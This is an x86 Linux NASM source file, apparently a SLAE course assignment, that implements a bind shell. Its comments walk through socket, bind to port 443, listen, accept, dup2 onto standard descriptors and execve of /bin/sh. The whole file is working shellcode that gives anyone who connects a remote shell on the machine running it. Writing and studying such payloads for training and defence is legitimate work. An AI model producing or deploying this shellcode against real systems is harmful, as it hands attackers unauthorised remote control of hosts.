;Bind Shell - Linux/x86 NASM
;Author: Nathu Nandwani
;SecurityTube ID: SLAE-1261


global _start
section .text
_start:

	;bind(fd, (address of struct), sizeof(struct))

	;socketcall = 0x66
	;bind = 0x02

	;eax = 0x66
	;ebx = 0x02
	;ecx = addr of args

	;args: fd, address of struct, sizeof(struct)

	;push size of struct
	;push address of struct
	;push fd
	;ecx = esp

	xor eax, eax
	xor ebx, ebx
	xor ecx, ecx	
	mov al, 0x66		; SYS_SOCKETCALL
	mov bl, 0x01		; SYS_SOCKET

				; int sockfd = socket(AF_INET, SOCK_STREAM, 0);
	push ecx		; SINGLE PROTOCOL = 0x00	
	inc ecx			
	push ecx		; SOCK_STREAM = 0x01
	inc ecx
	push ecx		; AF_INET = 0x02
	mov ecx, esp
	int 0x80

	xor ecx, ecx
	mov bl, 0x02		; SYS_BIND
	push ecx
	push ecx
	push ecx
	mov cx, 0xbb01		; port = 443
	shl ecx, 16
	mov cl, 0x02		; AF_INET
	push ecx
	mov esi, esp
	push 16
	push esi
	push eax		; sockfd
	mov ecx, esp

	mov al, 0x66		; SYS_SOCKETCALL
	int 0x80

	mov bl, 0x04		; SYS_LISTEN
	xor eax, eax
	mov dword[esp + 4], eax	; backlog = 0
	mov ecx, esp

	mov al, 0x66		; SYS_SOCKETCALL
	int 0x80

	mov bl, 0x05		; SYS_ACCEPT
	xor eax, eax
	mov dword[esp + 8], eax
	
	mov al, 0x66		; SYS_SOCKETCALL
	int 0x80

	mov ebx, eax
	xor eax, eax
	xor ecx, ecx
again:				; dup2(acceptfd, 0) -> dup2(acceptfd, 2)
	mov al, 0x3f
	int 0x80	
	inc ecx
	cmp ecx, 4
	jne again
	
	mov al, 0x0b		; execve("/bin/sh", null, null)
	xor ecx, ecx
	xor edx, edx
	push edx
	push "//sh"
	push "/bin"	
	mov ebx, esp
	int 0x80
